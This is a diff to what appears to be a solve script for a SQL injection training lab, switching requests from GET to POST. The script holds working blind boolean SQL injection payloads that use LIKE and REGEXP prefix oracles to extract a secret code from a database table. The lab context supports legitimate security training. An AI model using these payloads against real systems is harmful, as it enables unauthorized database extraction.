@@ -6,15 +6,15 @@ Extracts the warehouse code from 'warehouse_codes' using LIKE
 prefix matching as a boolean oracle.
 
 Usage:
-    python3 lab10_blind_like.py [TARGET_URL]
+    python3 lab10_blind_like.py [BASE_URL]
 
-Default target: http://localhost/SQLi-Arena/public/lab.php
+Default target: http://localhost/SQLi-Arena
 """
 import requests
 import sys
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
-PARAMS_BASE = {"lab": "mysql/lab10", "mode": "black"}
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
+TARGET = f"{BASE}/mysql/lab10"
 
 TRUE_MARKER = "result-data"
 
@@ -27,8 +27,7 @@ def check_like(prefix):
     # Escape LIKE special characters (% and _)
     safe = prefix.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")
     payload = f"SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE BINARY '{safe}%' -- -"
-    params = {**PARAMS_BASE, "sku": payload}
-    r = requests.get(TARGET, params=params)
+    r = requests.post(TARGET, data={"sku": payload})
     return TRUE_MARKER in r.text
 
 
@@ -38,8 +37,7 @@ def check_regexp(prefix):
     import re
     safe = re.escape(prefix)
     payload = f"SKU001' AND (SELECT BINARY code FROM warehouse_codes LIMIT 1) REGEXP '^{safe}' -- -"
-    params = {**PARAMS_BASE, "sku": payload}
-    r = requests.get(TARGET, params=params)
+    r = requests.post(TARGET, data={"sku": payload})
     return TRUE_MARKER in r.text
 
 
@@ -47,8 +45,7 @@ def check_regexp(prefix):
 print(f"[*] Target: {TARGET}")
 print("[*] Confirming boolean oracle...")
 test_payload = "SKU001' AND 1=1 -- -"
-params = {**PARAMS_BASE, "sku": test_payload}
-r = requests.get(TARGET, params=params)
+r = requests.post(TARGET, data={"sku": test_payload})
 if TRUE_MARKER not in r.text:
     print("[-] ERROR: Oracle not working. Check TARGET URL.")
     sys.exit(1)
